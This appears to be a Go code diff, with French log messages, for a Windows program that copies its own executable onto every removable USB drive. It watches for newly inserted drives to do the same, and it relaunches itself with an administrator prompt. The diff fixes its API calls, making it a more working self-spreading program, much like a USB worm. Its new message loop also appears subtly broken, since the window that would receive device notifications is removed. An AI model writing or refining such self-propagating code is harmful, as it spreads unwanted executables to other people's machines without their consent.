@@ -7,27 +7,30 @@ import (
 	"path/filepath"
 	"syscall"
 	"unsafe"
-
-	"golang.org/x/sys/windows"
 )
 
 var (
-	user32           = syscall.NewLazyDLL("user32.dll")
-	kernel32         = syscall.NewLazyDLL("kernel32.dll")
-	registerDevice   = user32.NewProc("RegisterDeviceNotificationW")
+	kernel32 = syscall.NewLazyDLL("kernel32.dll")
+	shell32  = syscall.NewLazyDLL("shell32.dll")
+	user32   = syscall.NewLazyDLL("user32.dll")
+	advapi32 = syscall.NewLazyDLL("advapi32.dll")
+
+	getDriveTypeW    = kernel32.NewProc("GetDriveTypeW")
+	shellExecuteW    = shell32.NewProc("ShellExecuteW")
 	getMessage       = user32.NewProc("GetMessageW")
 	translateMessage = user32.NewProc("TranslateMessage")
 	dispatchMessage  = user32.NewProc("DispatchMessageW")
-	createWindowEx   = user32.NewProc("CreateWindowExW")
-	defWindowProc    = user32.NewProc("DefWindowProcW")
+	openProcessToken = advapi32.NewProc("OpenProcessToken")
+	getTokenInfo     = advapi32.NewProc("GetTokenInformation")
 )
 
 const (
 	WM_DEVICECHANGE   = 0x0219
 	DBT_DEVICEARRIVAL = 0x8000
 	DBT_DEVTYP_VOLUME = 0x00000002
-	WS_OVERLAPPEDWINDOW = 0x00CF0000
-	CW_USEDEFAULT = -2147483648
+	DRIVE_REMOVABLE   = 2
+	TOKEN_QUERY       = 0x0008
+	TokenElevation    = 20
 )
 
 type DEV_BROADCAST_VOLUME struct {
@@ -49,6 +52,10 @@ type MSG struct {
 	}
 }
 
+type TOKEN_ELEVATION struct {
+	TokenIsElevated uint32
+}
+
 func main() {
 	if !isAdmin() {
 		relaunchAsAdmin()
@@ -60,26 +67,35 @@ func main() {
 
 	exePath, err := os.Executable()
 	if err != nil {
-		fmt.Println("Erreur:", err)
+		fmt.Println("Erreur lors de la récupération du chemin:", err)
 		return
 	}
 
+	fmt.Println("Copie vers les clés USB existantes...")
 	copyToAllUSBs(exePath)
 
+	fmt.Println("En attente de nouvelles clés USB...")
 	// Écoute des messages système pour détecter les nouvelles clés USB
 	var msg MSG
 	for {
-		ret, _, _ := getMessage.Call(0, 0, 0, 0)
+		ret, _, _ := getMessage.Call(
+			uintptr(unsafe.Pointer(&msg)),
+			0,
+			0,
+			0,
+		)
 		if ret == 0 {
 			break
 		}
+
 		if msg.Message == WM_DEVICECHANGE {
 			if msg.WParam == uintptr(DBT_DEVICEARRIVAL) {
 				dev := (*DEV_BROADCAST_VOLUME)(unsafe.Pointer(msg.LParam))
-				if dev.dbcvDevicetype == DBT_DEVTYP_VOLUME {
+				if dev != nil && dev.dbcvDevicetype == DBT_DEVTYP_VOLUME {
 					for i := 0; i < 26; i++ {
 						if dev.dbcvUnitmask&(1<<uint(i)) != 0 {
 							drive := string(rune('A'+i)) + ":\\"
+							fmt.Println("Nouvelle clé USB détectée:", drive)
 							copyToDrive(exePath, drive)
 						}
 					}
@@ -94,9 +110,12 @@ func main() {
 func copyToAllUSBs(exePath string) {
 	for letter := 'D'; letter <= 'Z'; letter++ {
 		drive := string(letter) + ":\\"
-		driveType, _, _ := syscall.GetDriveType(exePath, &drive)
-		// DRIVE_REMOVABLE = 2
-		if driveType == 2 {
+		drivePtr, _ := syscall.UTF16PtrFromString(drive)
+
+		ret, _, _ := getDriveTypeW.Call(uintptr(unsafe.Pointer(drivePtr)))
+
+		if ret == DRIVE_REMOVABLE {
+			fmt.Println("Clé USB trouvée:", drive)
 			copyToDrive(exePath, drive)
 		}
 	}
@@ -106,7 +125,9 @@ func copyToDrive(exePath, drive string) {
 	destFile := filepath.Join(drive, filepath.Base(exePath))
 	err := copyFile(exePath, destFile)
 	if err != nil {
-		fmt.Println("Erreur copie:", err)
+		fmt.Println("Erreur lors de la copie vers", drive, ":", err)
+	} else {
+		fmt.Println("Copie réussie vers", destFile)
 	}
 }
 
@@ -131,20 +152,62 @@ func copyFile(src, dst string) error {
 }
 
 func isAdmin() bool {
-	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
-	if err != nil {
+	var token syscall.Token
+	proc, _ := syscall.GetCurrentProcess()
+
+	ret, _, _ := openProcessToken.Call(
+		uintptr(proc),
+		TOKEN_QUERY,
+		uintptr(unsafe.Pointer(&token)),
+	)
+
+	if ret == 0 {
 		return false
 	}
-	return true
+	defer syscall.CloseHandle(syscall.Handle(token))
+
+	var elevation TOKEN_ELEVATION
+	var returnLength uint32
+
+	ret, _, _ = getTokenInfo.Call(
+		uintptr(token),
+		TokenElevation,
+		uintptr(unsafe.Pointer(&elevation)),
+		unsafe.Sizeof(elevation),
+		uintptr(unsafe.Pointer(&returnLength)),
+	)
+
+	if ret == 0 {
+		return false
+	}
+
+	return elevation.TokenIsElevated != 0
 }
 
 func relaunchAsAdmin() {
 	exe, err := os.Executable()
 	if err != nil {
+		fmt.Println("Erreur:", err)
 		return
 	}
-	verbPtr := syscall.StringToUTF16Ptr("runas")
-	exePtr := syscall.StringToUTF16Ptr(exe)
-	syscall.LazyProc{}.Call(0, uintptr(unsafe.Pointer(verbPtr)), uintptr(unsafe.Pointer(exePtr)), 0, 0, 1)
 
+	verbPtr, _ := syscall.UTF16PtrFromString("runas")
+	exePtr, _ := syscall.UTF16PtrFromString(exe)
+	cwdPtr, _ := syscall.UTF16PtrFromString("")
+
+	ret, _, _ := shellExecuteW.Call(
+		0,
+		uintptr(unsafe.Pointer(verbPtr)),
+		uintptr(unsafe.Pointer(exePtr)),
+		0,
+		uintptr(unsafe.Pointer(cwdPtr)),
+		1, // SW_SHOWNORMAL
+	)
+
+	if ret > 32 {
+		fmt.Println("Relancement en tant qu'administrateur...")
+		os.Exit(0)
+	} else {
+		fmt.Println("Impossible de relancer en tant qu'administrateur")
+	}
 }
